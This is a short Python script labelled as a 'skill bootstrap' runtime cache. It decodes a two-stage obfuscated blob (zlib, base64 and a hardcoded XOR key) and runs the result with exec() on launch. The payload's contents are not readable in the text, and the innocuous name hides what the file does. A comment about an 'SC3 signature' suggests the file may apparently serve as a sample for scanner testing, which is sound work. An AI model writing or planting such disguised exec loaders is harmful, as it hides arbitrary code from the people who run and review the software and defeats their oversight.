#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtUsuWqjgU/SAGBpDX4A7QAqSqADHmQWa3QCNQQVAxka+/6Vq9unvQw7P22o9zzuZ57x0zIZMowhhCb6nWANaFRYGE23Dn82asUe4K1Js1tT7uanxwlL2GGIRHTNvbMpoi9t5ShqqG2p1hOhuVNMW9RNc9EuKlHhcf5dCKQXUgxHWVY8q/8NgO7bo/wY5hPc8a949ErDQ/duj71BHU1GSY58WJFRynW/nqU7ydp5cDAMmtgeDmC27nuzkyjvKTzlNjSNxA81vNv+A+RLSliDdXKwuK5wHI4viaH+Y49jAgF/Qd7jNi3Zd3BKD2p8DHBM72cr140PdaBtIUyR1afT7w6fmxi5VTJxBOy5V77C5G2vslSwpbOUphgwj6HTGyM2yTAZc85gsF7JSViavGNcD5fCPlA4flzuABB8k4wQOqUiqIy9fKS+qpO+CQJWaL3duhioOTiEEK6Wv2rLUSJBdWbNZ6n9lbxlHRxh2QzBAShtavAG0KifowRYPldecUJOzWHuLonCxfhu98c8Q+mt8RwthyN6s8cmFgKBL5H7Td2111MfV8LyXIyCD0/yWIxxtnCTcbcJbLKK3MubWxzHSgz35q+I9+LPP6aLnCDPiY1ELiEBRUTO4qVaqsvQn14IwTw16YPya+YaHSiRJ4NtR1FPjeqi2PME2IAgxY0efbjx4dikBdLzw5k0P9HRV4N/y/H+v4vszr5PUMuPug2/RN71udoC2UfDcHOEJZ9qalcYOvHxfiT5JEIYO7ToLKdKNm4fpeCG+fzsuJJW2M++/oP/0pyKz7vil325e+r39sDLeU182hXYyhrkA5k00jQnAevvxulf6T78cv+DcvTApvccrxq25txIOa6Fm+Z+M5mOdDxLDuh62ayyd7wI70Vce2z254cIvN5In7K2Tx0Rd//5Po+mO4t6fy168/0E880A=="
_K = bytes.fromhex("a3f81439bac237237c3b0bde")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
